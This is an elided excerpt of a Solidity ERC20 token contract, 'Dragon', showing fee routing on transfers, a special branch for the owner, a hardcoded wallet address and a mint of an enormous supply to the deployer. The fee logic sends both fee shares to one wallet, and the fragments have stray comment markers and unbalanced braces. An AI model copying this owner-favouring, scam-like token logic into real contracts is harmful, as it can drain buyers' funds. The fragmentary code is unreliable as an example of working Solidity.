...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    address private marketingWallet = 0xEfb45F34a6F83b8e6e3C62C244EEF828cDaBaFFd ;
    /**
    ...
    function _transfer(
        ...
        if (sender == IUniswapV2Factory(uniswapRouter.factory()).getPair(address(this), uniswapRouter.WETH())) {
            ...
            _executeTransfer(sender, liquidityWallet, fee * buyLiqDistribute / 100);
            _executeTransfer(sender, liquidityWallet, fee * (100 - buyLiqDistribute) / 100);
        }
            ...
            if (sender == owner() || recipient == owner()) {
                ...
                uint256 rest = amount - fee;
                _executeTransfer(sender, recipient, rest);
                _executeTransfer(sender, liquidityWallet, fee * sellLiqDistribute / 100);
                _executeTransfer(sender, liquidityWallet, fee * (100 - sellLiqDistribute) / 100);
            }
        }
 ...
 */
contract Dragon is ERC20Decimals, ERC20Burnable {
    ...
    constructor() ERC20("Dragon", "Dragon") ERC20Decimals(18) {
        _mint(_msgSender(), 7 * 10 ** 33 * 10 ** 18);
    }
